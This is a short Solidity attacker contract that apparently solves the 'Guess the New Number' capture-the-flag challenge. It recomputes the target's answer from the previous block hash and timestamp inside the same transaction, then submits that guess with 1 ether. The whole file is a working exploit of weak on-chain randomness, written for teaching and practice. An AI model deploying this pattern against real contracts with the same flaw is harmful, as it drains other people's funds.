pragma solidity 0.4.21;

import "../challenge/GuessTheNewNumberChallenge.sol";
contract GuessTheNewNumberChallengeAttacker {
    function attack(address target) public payable {
        uint8 answer = calculateGuess();
        GuessTheNewNumberChallenge(target).guess.value(1 ether)(answer);
    }

    function calculateGuess() private view returns (uint8) {
        return uint8(keccak256(block.blockhash(block.number - 1), now));
    }

    function () external payable {}
}